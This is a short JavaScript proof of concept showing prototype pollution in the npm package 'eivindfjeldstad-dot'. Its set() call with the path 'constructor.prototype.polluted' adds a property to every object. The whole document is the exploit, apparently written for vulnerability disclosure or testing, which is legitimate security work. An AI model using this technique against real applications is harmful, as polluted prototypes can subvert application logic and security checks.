const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = 'constructor.prototype.polluted';
a.set({}, path, 'yes');
console.log({}.polluted);